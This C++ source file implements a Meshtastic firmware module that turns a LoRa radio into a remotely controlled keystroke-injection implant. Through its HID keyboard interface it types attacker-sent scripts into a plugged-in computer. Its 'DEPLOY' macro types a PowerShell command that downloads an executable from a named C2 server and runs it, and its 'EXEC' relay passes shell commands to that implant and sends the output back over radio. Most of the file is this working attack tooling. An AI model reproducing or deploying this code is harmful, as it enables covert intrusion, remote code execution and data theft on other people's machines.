#include "HIDKeyboard.h"
#include "mesh/generated/meshtastic/mesh.pb.h"
#include "mesh/MeshTypes.h"  // For isToUs() and isBroadcast()
#include "Router.h"
#include "MeshService.h"
#ifdef ARCH_ESP32
#include "tusb.h"  // For tud_mounted() to check USB host connection
#endif

// Global USB HID objects
USBHIDKeyboard Keyboard;
USBHIDVendor   VendorHID;

HIDKeyboardModule *hidKeyboardModule;

HIDKeyboardModule::HIDKeyboardModule() : MeshModule("HIDKeyboard")
{
    LOG_DEBUG("HID Keyboard: Initializing HID at boot time");

    Keyboard.begin();
    VendorHID.setRxBufferSize(4096);
    VendorHID.begin();
    USB.begin();

    delay(1000);

    LOG_DEBUG("HID Keyboard: USB HID Keyboard + LokiBridge Ready!");
    LOG_DEBUG("HID Keyboard: Soldered USB: HID Keyboard + Vendor HID (GPIO 19/20)");
    LOG_DEBUG("HID Keyboard: UART Serial: Communication port");
    LOG_DEBUG("HID Keyboard: Send LoRa messages to type on HID keyboard");

    hidInitialized = true;
    hidReady = true;

    LOG_DEBUG("HID Keyboard: HID ready for keystrokes at boot");
}

bool HIDKeyboardModule::wantPacket(const meshtastic_MeshPacket *p)
{
    return p->decoded.portnum == meshtastic_PortNum_TEXT_MESSAGE_APP;
}

bool HIDKeyboardModule::init()
{
    LOG_DEBUG("HID Keyboard: init() called - HID already initialized at boot");
    return true;
}

bool HIDKeyboardModule::isReady()
{
    return hidInitialized && hidReady;
}

bool HIDKeyboardModule::isHostConnected()
{
#ifdef ARCH_ESP32
    return tud_mounted();
#else
    return isReady();
#endif
}

// ---------------------------------------------------------------------------
// LoRa message handling
// ---------------------------------------------------------------------------
ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    LOG_DEBUG("HID Keyboard: Message received");

    if (!isReady()) {
        LOG_DEBUG("HID Keyboard: Not ready, skipping message");
        return ProcessMessage::CONTINUE;
    }

    if (mp.decoded.portnum != meshtastic_PortNum_TEXT_MESSAGE_APP) {
        LOG_DEBUG("HID Keyboard: Not a text message, skipping");
        return ProcessMessage::CONTINUE;
    }

    bool isDirectMessage = isToUs(&mp);
    bool isBroadcastMessage = isBroadcast(mp.to);

    LOG_DEBUG("HID Keyboard: Message type - Direct: %d, Broadcast: %d, From: 0x%x, To: 0x%x",
              isDirectMessage, isBroadcastMessage, mp.from, mp.to);

    if (!isDirectMessage) {
        LOG_DEBUG("HID Keyboard: Not a direct message, ignoring");
        return ProcessMessage::CONTINUE;
    }

    String message = String((const char*)mp.decoded.payload.bytes, mp.decoded.payload.size);
    LOG_DEBUG("HID Keyboard: Received message: %s", message.c_str());

    String messageUpper = message;
    messageUpper.toUpperCase();
    messageUpper.trim();

    // PING — respond with PONG/NOPE
    if (messageUpper == "PING") {
        bool hostConnected = isReady() && isHostConnected();
        const char *response = hostConnected ? "PONG" : "NOPE";
        LOG_DEBUG("HID Keyboard: Received PING, responding with %s", response);

        meshtastic_MeshPacket *p = router->allocForSending();
        p->to = getFrom(&mp);
        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
        p->want_ack = false;
        p->decoded.want_response = false;
        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
        memcpy(p->decoded.payload.bytes, response, strlen(response));
        p->decoded.payload.size = strlen(response);
        service->sendToMesh(p);

        return ProcessMessage::CONTINUE;
    }

    // EXEC <cmd> — send command to LokiMon via LokiBridge
    if (messageUpper.startsWith("EXEC ")) {
        if (awaitingResponse) {
            LOG_DEBUG("LokiBridge: EXEC discarded, previous command still pending");
            return ProcessMessage::CONTINUE;
        }
        String shellCmd = message.substring(5);
        shellCmd.trim();
        LOG_DEBUG("LokiBridge: EXEC command received over LoRa from 0x%x: %s", mp.from, shellCmd.c_str());
        lokiBridgeSender = mp.from;
        sendLokiBridgeCmd(shellCmd.c_str());
        awaitingResponse = true;
        LOG_DEBUG("LokiBridge: Command sent to LokiMon, awaiting response");
        return ProcessMessage::CONTINUE;
    }

    // LBRESET — reset LokiBridge link (unconditionally returns to IDLE)
    if (messageUpper == "LBRESET") {
        LOG_DEBUG("LokiBridge: LBRESET command received over LoRa from 0x%x", mp.from);
        chunkLen = 0;
        chunkCount = 0;
        messageInProgress = false;
        awaitingResponse = false;
        sendLokiBridgeReset();
        LOG_DEBUG("LokiBridge: State cleared to IDLE, reset sent to LokiMon (best-effort)");

        meshtastic_MeshPacket *p = router->allocForSending();
        p->to = getFrom(&mp);
        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
        p->want_ack = false;
        p->decoded.want_response = false;
        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
        const char *response = "LB IDLE";
        memcpy(p->decoded.payload.bytes, response, strlen(response));
        p->decoded.payload.size = strlen(response);
        service->sendToMesh(p);

        return ProcessMessage::CONTINUE;
    }

    // LBSTATUS — report LokiBridge status back over LoRa
    if (messageUpper == "LBSTATUS") {
        LOG_DEBUG("LokiBridge: LBSTATUS command received over LoRa from 0x%x", mp.from);
        String status = getLokiBridgeStatus();

        meshtastic_MeshPacket *p = router->allocForSending();
        p->to = getFrom(&mp);
        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
        p->want_ack = false;
        p->decoded.want_response = false;
        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
        memcpy(p->decoded.payload.bytes, status.c_str(), status.length());
        p->decoded.payload.size = status.length();
        service->sendToMesh(p);
        LOG_DEBUG("LokiBridge: Status sent back over LoRa");

        return ProcessMessage::CONTINUE;
    }

    // PSH — open PowerShell on target
    if (messageUpper == "PSH") {
        LOG_DEBUG("HID Keyboard: PSH macro received over LoRa from 0x%x", mp.from);
        executePSH();
        return ProcessMessage::CONTINUE;
    }

    // DEPLOY <c2-server> — download and run LokiMon
    if (messageUpper.startsWith("DEPLOY ")) {
        String c2Server = message.substring(7);
        c2Server.trim();
        LOG_DEBUG("HID Keyboard: DEPLOY macro received over LoRa from 0x%x, server: %s", mp.from, c2Server.c_str());
        executeDeploy(c2Server);
        return ProcessMessage::CONTINUE;
    }

    // LoKey Script commands (STRING, GUI, CTRL, etc.)
    if (messageUpper.startsWith("STRING ") || messageUpper.startsWith("STRINGLN ") ||
        messageUpper.startsWith("ENTER") || messageUpper.startsWith("TAB") ||
        messageUpper.startsWith("BACKSPACE") || messageUpper.startsWith("SPACE") ||
        messageUpper.startsWith("LEFT") || messageUpper.startsWith("RIGHT") ||
        messageUpper.startsWith("GUI ") || messageUpper.startsWith("ALT ") ||
        messageUpper.startsWith("CTRL ") || messageUpper.startsWith("DELAY ")) {
        LOG_DEBUG("HID Keyboard: Detected LoKey Script format");
        String originalMessage = String((const char*)mp.decoded.payload.bytes, mp.decoded.payload.size);
        executeLoKeyScript(originalMessage);
    } else {
        LOG_DEBUG("HID Keyboard: Not a recognized command, ignoring message");
    }

    return ProcessMessage::CONTINUE;
}

// ---------------------------------------------------------------------------
// LokiBridge: main loop polling
// ---------------------------------------------------------------------------
void HIDKeyboardModule::lokiBridgeLoop()
{
    handleSerialLokiBridge();

    if (!awaitingResponse)
        return;

    while (VendorHID.available() >= (int)LB_REPORT_SIZE) {
        uint8_t pollBuf[LB_REPORT_SIZE];
        size_t n = VendorHID.read(pollBuf, LB_REPORT_SIZE);
        if (n == LB_REPORT_SIZE) {
            processLokiBridgeReport(pollBuf);
        }
    }
}

// ---------------------------------------------------------------------------
// Serial command handling for LBSTATUS and LBRESET
// ---------------------------------------------------------------------------
void HIDKeyboardModule::handleSerialLokiBridge()
{
    while (Serial.available()) {
        char c = Serial.read();
        if (c == '\n' || c == '\r') {
            if (cmdBufPos > 0) {
                cmdBuf[cmdBufPos] = '\0';
                String cmd = String(cmdBuf);
                cmd.trim();
                cmd.toUpperCase();

                if (cmd == "LBSTATUS") {
                    String status = getLokiBridgeStatus();
                    Serial.printf("[LB] %s\n", status.c_str());
                }
                else if (cmd == "LBRESET") {
                    Serial.println("[LB] Resetting LokiBridge link...");
                    chunkLen = 0;
                    chunkCount = 0;
                    messageInProgress = false;
                    awaitingResponse = false;
                    sendLokiBridgeReset();
                    Serial.println("[LB] State cleared to IDLE, reset sent to LokiMon (best-effort)");
                }

                cmdBufPos = 0;
            }
        } else if (cmdBufPos < CMD_BUF_SIZE - 1) {
            cmdBuf[cmdBufPos++] = c;
        }
    }
}

// ---------------------------------------------------------------------------
// LokiBridge: send a command to LokiMon
// ---------------------------------------------------------------------------
void HIDKeyboardModule::sendLokiBridgeCmd(const char *cmdStr)
{
    uint8_t pkt[LB_REPORT_SIZE] = {};
    pkt[0] = LB_CTRL_SHORT;
    size_t len = strlen(cmdStr);
    if (len > LB_DATA_PER_REPORT) len = LB_DATA_PER_REPORT;
    memcpy(&pkt[1], cmdStr, len);
    VendorHID.write(pkt, LB_REPORT_SIZE);
    LOG_DEBUG("LokiBridge: Sent command to LokiMon (%u bytes)", (unsigned)len);
}

// ---------------------------------------------------------------------------
// LokiBridge: send a RESET to LokiMon
// ---------------------------------------------------------------------------
void HIDKeyboardModule::sendLokiBridgeReset()
{
    uint8_t pkt[LB_REPORT_SIZE] = {};
    pkt[0] = LB_CTRL_RESET;
    VendorHID.write(pkt, LB_REPORT_SIZE);
    LOG_DEBUG("LokiBridge: Sent RESET to LokiMon");
}

// ---------------------------------------------------------------------------
// LokiBridge: process one incoming 63-byte report from LokiMon
// ---------------------------------------------------------------------------
void HIDKeyboardModule::processLokiBridgeReport(const uint8_t *buf)
{
    uint8_t ctrl = buf[0];
    const uint8_t *data = &buf[1];

    switch (ctrl) {
        case LB_CTRL_SHORT: {
            size_t dataLen = LB_DATA_PER_REPORT;
            while (dataLen > 0 && data[dataLen - 1] == 0) dataLen--;

            if (dataLen > 0) {
                chunkCount = 1;
                memcpy(chunkBuf, data, dataLen);
                chunkBuf[dataLen] = '\0';
                LOG_DEBUG("LokiBridge: Short message received (%u bytes)", (unsigned)dataLen);
                sendLoRaResponse((const char *)chunkBuf);
            }
            awaitingResponse = false;
            messageInProgress = false;
            chunkLen = 0;
            break;
        }

        case LB_CTRL_START:
            chunkLen = 0;
            chunkCount = 0;
            messageInProgress = true;
            memcpy(chunkBuf + chunkLen, data, LB_DATA_PER_REPORT);
            chunkLen += LB_DATA_PER_REPORT;
            LOG_DEBUG("LokiBridge: Multi-chunk message started");
            break;

        case LB_CTRL_CONTINUE:
            if (chunkLen + LB_DATA_PER_REPORT <= LB_CHUNK_MAX) {
                memcpy(chunkBuf + chunkLen, data, LB_DATA_PER_REPORT);
                chunkLen += LB_DATA_PER_REPORT;
            }
            break;

        case LB_CTRL_CHUNK_BOUNDARY: {
            size_t room = LB_CHUNK_MAX - chunkLen;
            size_t copyLen = min(room, (size_t)LB_DATA_PER_REPORT);
            if (copyLen > 0) {
                memcpy(chunkBuf + chunkLen, data, copyLen);
                chunkLen += copyLen;
            }
            flushChunk(false);
            break;
        }

        case LB_CTRL_END: {
            size_t room = LB_CHUNK_MAX - chunkLen;
            size_t copyLen = min(room, (size_t)LB_DATA_PER_REPORT);
            if (copyLen > 0) {
                memcpy(chunkBuf + chunkLen, data, copyLen);
                chunkLen += copyLen;
            }
            flushChunk(true);
            break;
        }

        case LB_CTRL_RESET:
            LOG_DEBUG("LokiBridge: RESET ACK received, discarding");
            break;

        default:
            LOG_WARN("LokiBridge: Unknown control byte: 0x%02X", ctrl);
            break;
    }
}

// ---------------------------------------------------------------------------
// LokiBridge: flush reassembled chunk — send back over LoRa
// ---------------------------------------------------------------------------
void HIDKeyboardModule::flushChunk(bool isFinal)
{
    while (chunkLen > 0 && chunkBuf[chunkLen - 1] == 0) chunkLen--;

    if (chunkLen > 0) {
        chunkCount++;
        chunkBuf[chunkLen] = '\0';
        LOG_DEBUG("LokiBridge: Flushing chunk %d (%u bytes) to LoRa", chunkCount, (unsigned)chunkLen);
        sendLoRaResponse((const char *)chunkBuf);
    }

    chunkLen = 0;

    if (isFinal) {
        LOG_DEBUG("LokiBridge: Message complete (%d chunks)", chunkCount);
        awaitingResponse = false;
        messageInProgress = false;
        chunkCount = 0;
    }
}

// ---------------------------------------------------------------------------
// LokiBridge: send a text response back to the LoRa sender
// ---------------------------------------------------------------------------
void HIDKeyboardModule::sendLoRaResponse(const char *text)
{
    if (lokiBridgeSender == 0) {
        LOG_WARN("LokiBridge: No sender to respond to");
        return;
    }

    size_t len = strlen(text);
    if (len > sizeof(((meshtastic_MeshPacket *)0)->decoded.payload.bytes)) {
        LOG_WARN("LokiBridge: Response too large for single LoRa packet (%u bytes), truncating", (unsigned)len);
        len = sizeof(((meshtastic_MeshPacket *)0)->decoded.payload.bytes);
    }

    LOG_DEBUG("LokiBridge: Sending response over LoRa to 0x%x (%u bytes)", lokiBridgeSender, (unsigned)len);

    meshtastic_MeshPacket *p = router->allocForSending();
    p->to = lokiBridgeSender;
    p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
    p->want_ack = false;
    p->decoded.want_response = false;
    p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
    memcpy(p->decoded.payload.bytes, text, len);
    p->decoded.payload.size = len;
    service->sendToMesh(p);

    LOG_DEBUG("LokiBridge: Response sent over LoRa");
}

// ---------------------------------------------------------------------------
// LokiBridge: status string
// ---------------------------------------------------------------------------
String HIDKeyboardModule::getLokiBridgeStatus()
{
    if (!awaitingResponse)
        return String("LB IDLE");
    if (messageInProgress)
        return String("LB AWAIT IN_PROG");
    return String("LB AWAIT");
}

// ---------------------------------------------------------------------------
// Serial command handling for LBSTATUS and LBRESET
// ---------------------------------------------------------------------------
// Called from the serial console loop (main.cpp or SerialConsole)
// This is checked in the main loop alongside lokiBridgeLoop()

// ---------------------------------------------------------------------------
// HID Keyboard: text and LoKey script execution
// ---------------------------------------------------------------------------
void HIDKeyboardModule::convertTextToKeystrokes(const String &text)
{
    LOG_DEBUG("HID Keyboard: Converting text: %s", text.c_str());
    Keyboard.print(text);
    delay(300);
    LOG_DEBUG("HID Keyboard: Text sent as keystrokes");
}

void HIDKeyboardModule::executeLoKeyScript(const String &script)
{
    LOG_DEBUG("HID Keyboard: Executing LoKey Script");

    int startPos = 0;
    while (startPos < (int)script.length()) {
        int endPos = script.indexOf('\n', startPos);
        if (endPos == -1) {
            endPos = script.length();
        }

        String line = script.substring(startPos, endPos);
        line.trim();

        if (line.length() > 0) {
            LOG_DEBUG("HID Keyboard: Executing command: %s", line.c_str());
            executeLoKeyCommand(line);
            delay(100);
        }

        startPos = endPos + 1;
    }

    LOG_DEBUG("HID Keyboard: LoKey Script execution complete");
}

void HIDKeyboardModule::executeLoKeyCommand(const String &command)
{
    String commandUpper = command;
    commandUpper.toUpperCase();

    if (commandUpper.startsWith("STRING ")) {
        String text = command.substring(7);
        LOG_DEBUG("HID Keyboard: STRING command: %s", text.c_str());
        Keyboard.print(text);
        delay(100);
    }
    else if (commandUpper.startsWith("STRINGLN ")) {
        String text = command.substring(9);
        LOG_DEBUG("HID Keyboard: STRINGLN command: %s", text.c_str());
        Keyboard.print(text);
        delay(100);
        pressEnter();
    }
    else if (commandUpper == "ENTER") {
        LOG_DEBUG("HID Keyboard: ENTER command");
        pressEnter();
    }
    else if (commandUpper == "TAB") {
        LOG_DEBUG("HID Keyboard: TAB command");
        pressTab();
    }
    else if (commandUpper == "BACKSPACE") {
        LOG_DEBUG("HID Keyboard: BACKSPACE command");
        pressBackspace();
    }
    else if (commandUpper == "SPACE") {
        LOG_DEBUG("HID Keyboard: SPACE command");
        pressSpace();
    }
    else if (commandUpper == "LEFT") {
        LOG_DEBUG("HID Keyboard: LEFT command");
        pressLeft();
    }
    else if (commandUpper == "RIGHT") {
        LOG_DEBUG("HID Keyboard: RIGHT command");
        pressRight();
    }
    else if (commandUpper.startsWith("GUI ")) {
        String key = command.substring(4);
        key.trim();
        LOG_DEBUG("HID Keyboard: GUI command: %s", key.c_str());
        if (key.length() > 0) {
            uint8_t keyCode = stringToKeyCode(key);
            if (keyCode != 0) {
                pressKeyCombo(HID_KEY_GUI_LEFT, keyCode);
            }
        }
    }
    else if (commandUpper.startsWith("ALT ")) {
        String key = command.substring(4);
        key.trim();
        LOG_DEBUG("HID Keyboard: ALT command: %s", key.c_str());
        if (key.length() > 0) {
            uint8_t keyCode = stringToKeyCode(key);
            if (keyCode != 0) {
                pressKeyCombo(HID_KEY_ALT_LEFT, keyCode);
            }
        }
    }
    else if (commandUpper.startsWith("CTRL SHIFT ")) {
        String key = command.substring(11);
        key.trim();
        LOG_DEBUG("HID Keyboard: CTRL SHIFT command: %s", key.c_str());
        if (key.length() > 0) {
            uint8_t keyCode = stringToKeyCode(key);
            if (keyCode != 0) {
                pressKeyComboMulti(HID_KEY_CONTROL_LEFT, HID_KEY_SHIFT_LEFT, keyCode);
            }
        }
    }
    else if (commandUpper.startsWith("CTRL ")) {
        String key = command.substring(5);
        key.trim();
        LOG_DEBUG("HID Keyboard: CTRL command: %s", key.c_str());
        if (key.length() > 0) {
            uint8_t keyCode = stringToKeyCode(key);
            if (keyCode != 0) {
                pressKeyCombo(HID_KEY_CONTROL_LEFT, keyCode);
            }
        }
    }
    else if (commandUpper.startsWith("DELAY ")) {
        String delayStr = command.substring(6);
        delayStr.trim();
        LOG_DEBUG("HID Keyboard: DELAY command: %s ms", delayStr.c_str());
        if (delayStr.length() > 0) {
            unsigned long delayMs = delayStr.toInt();
            if (delayMs > 0) {
                LOG_DEBUG("HID Keyboard: Delaying for %lu ms", delayMs);
                delay(delayMs);
            } else {
                LOG_DEBUG("HID Keyboard: Invalid delay value: %s", delayStr.c_str());
            }
        }
    }
    else {
        LOG_DEBUG("HID Keyboard: Unknown command: %s", command.c_str());
    }
}

uint8_t HIDKeyboardModule::stringToKeyCode(const String &key)
{
    String keyLower = key;
    keyLower.toLowerCase();

    if (keyLower.startsWith("f")) {
        int fNum = keyLower.substring(1).toInt();
        if (fNum >= 1 && fNum <= 12) {
            return (HID_KEY_F1 + fNum - 1);
        }
    }

    if (keyLower.length() == 1) {
        char c = keyLower.charAt(0);
        if (c >= 'a' && c <= 'z') {
            return (HID_KEY_A + (c - 'a'));
        }
        else if (c >= '0' && c <= '9') {
            if (c == '0') return HID_KEY_0;
            return (HID_KEY_1 + (c - '1'));
        }
    }

    if (keyLower == "enter" || keyLower == "return") return HID_KEY_ENTER;
    if (keyLower == "tab") return HID_KEY_TAB;
    if (keyLower == "space") return HID_KEY_SPACE;
    if (keyLower == "backspace") return HID_KEY_BACKSPACE;
    if (keyLower == "esc" || keyLower == "escape") return HID_KEY_ESCAPE;
    if (keyLower == "delete") return HID_KEY_DELETE;
    if (keyLower == "up") return HID_KEY_ARROW_UP;
    if (keyLower == "down") return HID_KEY_ARROW_DOWN;
    if (keyLower == "left") return HID_KEY_ARROW_LEFT;
    if (keyLower == "right") return HID_KEY_ARROW_RIGHT;

    LOG_DEBUG("HID Keyboard: Unknown key: %s", key.c_str());
    return 0;
}

// ---------------------------------------------------------------------------
// Macro: PSH — open a PowerShell prompt on the target
// ---------------------------------------------------------------------------
void HIDKeyboardModule::executePSH()
{
    LOG_DEBUG("HID Keyboard: Executing PSH macro");
    pressKeyCombo(HID_KEY_GUI_LEFT, stringToKeyCode("r"));
    delay(2000);
    Keyboard.print("POWERSHELL.EXE");
    delay(100);
    pressEnter();
    LOG_DEBUG("HID Keyboard: PSH macro complete");
}

// ---------------------------------------------------------------------------
// Macro: DNLD — download and run LokiMon from a C2 server
// ---------------------------------------------------------------------------
void HIDKeyboardModule::executeDeploy(const String &c2Server)
{
    LOG_DEBUG("HID Keyboard: Executing DEPLOY macro, server: %s", c2Server.c_str());
    String cmd = "$p=\"$env:TEMP\\lm.exe\"; Invoke-WebRequest -Uri http://";
    cmd += c2Server;
    cmd += "/lokimon.exe -OutFile $p; Start-Process $p";
    Keyboard.print(cmd);
    delay(100);
    pressEnter();
    LOG_DEBUG("HID Keyboard: DEPLOY macro complete");
}

void HIDKeyboardModule::pressKeyCombo(uint8_t modifier, uint8_t key)
{
    LOG_DEBUG("HID Keyboard: Pressing key combo: modifier=0x%02X, key=0x%02X", modifier, key);
    Keyboard.pressRaw(modifier);
    delay(20);
    Keyboard.pressRaw(key);
    delay(150);
    Keyboard.releaseRaw(key);
    delay(20);
    Keyboard.releaseRaw(modifier);
    Keyboard.releaseAll();
    delay(100);
}

void HIDKeyboardModule::pressKeyComboMulti(uint8_t modifier1, uint8_t modifier2, uint8_t key)
{
    LOG_DEBUG("HID Keyboard: Pressing multi-key combo: modifier1=0x%02X, modifier2=0x%02X, key=0x%02X",
              modifier1, modifier2, key);
    Keyboard.pressRaw(modifier1);
    delay(20);
    Keyboard.pressRaw(modifier2);
    delay(20);
    Keyboard.pressRaw(key);
    delay(150);
    Keyboard.releaseRaw(key);
    delay(20);
    Keyboard.releaseRaw(modifier2);
    delay(20);
    Keyboard.releaseRaw(modifier1);
    Keyboard.releaseAll();
    delay(100);
}

void HIDKeyboardModule::pressEnter()
{
    LOG_DEBUG("HID Keyboard: Pressing ENTER key");
    Keyboard.pressRaw(HID_KEY_ENTER);
    delay(50);
    Keyboard.releaseRaw(HID_KEY_ENTER);
    delay(100);
}

void HIDKeyboardModule::pressTab()
{
    LOG_DEBUG("HID Keyboard: Pressing TAB key");
    Keyboard.pressRaw(HID_KEY_TAB);
    delay(50);
    Keyboard.releaseRaw(HID_KEY_TAB);
    delay(100);
}

void HIDKeyboardModule::pressBackspace()
{
    LOG_DEBUG("HID Keyboard: Pressing BACKSPACE key");
    Keyboard.pressRaw(HID_KEY_BACKSPACE);
    delay(50);
    Keyboard.releaseRaw(HID_KEY_BACKSPACE);
    delay(100);
}

void HIDKeyboardModule::pressSpace()
{
    LOG_DEBUG("HID Keyboard: Pressing SPACE key");
    Keyboard.pressRaw(HID_KEY_SPACE);
    delay(50);
    Keyboard.releaseRaw(HID_KEY_SPACE);
    delay(100);
}

void HIDKeyboardModule::pressLeft()
{
    LOG_DEBUG("HID Keyboard: Pressing LEFT ARROW key");
    Keyboard.pressRaw(HID_KEY_ARROW_LEFT);
    delay(50);
    Keyboard.releaseRaw(HID_KEY_ARROW_LEFT);
    delay(100);
}

void HIDKeyboardModule::pressRight()
{
    LOG_DEBUG("HID Keyboard: Pressing RIGHT ARROW key");
    Keyboard.pressRaw(HID_KEY_ARROW_RIGHT);
    delay(50);
    Keyboard.releaseRaw(HID_KEY_ARROW_RIGHT);
    delay(100);
}

// Weak stubs for TinyUSB device class callbacks not used by HID keyboard.
extern "C" {
__attribute__((weak)) void tud_dfu_runtime_reboot_to_dfu_cb(void) {}
__attribute__((weak)) uint32_t tud_dfu_get_timeout_cb(uint8_t /*alt*/, uint8_t /*state*/) { return 0; }
__attribute__((weak)) void tud_dfu_download_cb(uint8_t /*alt*/, uint16_t /*block*/, const uint8_t* /*data*/, uint16_t /*len*/) {}
__attribute__((weak)) void tud_dfu_manifest_cb(uint8_t /*alt*/) {}
__attribute__((weak)) bool tud_network_recv_cb(const uint8_t* /*src*/, uint16_t /*size*/) { return false; }
__attribute__((weak)) bool tud_msc_test_unit_ready_cb(uint8_t /*lun*/) { return false; }
__attribute__((weak)) void tud_msc_capacity_cb(uint8_t /*lun*/, uint32_t* /*block_count*/, uint16_t* /*block_size*/) {}
__attribute__((weak)) int32_t tud_msc_read10_cb(uint8_t /*lun*/, uint32_t /*lba*/, uint32_t /*offset*/, void* /*buf*/, uint32_t /*bufsize*/) { return -1; }
__attribute__((weak)) int32_t tud_msc_write10_cb(uint8_t /*lun*/, uint32_t /*lba*/, uint32_t /*offset*/, uint8_t* /*buf*/, uint32_t /*bufsize*/) { return -1; }
__attribute__((weak)) int32_t tud_msc_scsi_cb(uint8_t /*lun*/, const uint8_t /*scsi_cmd*/[16], void* /*buf*/, uint16_t /*bufsize*/) { return -1; }
}
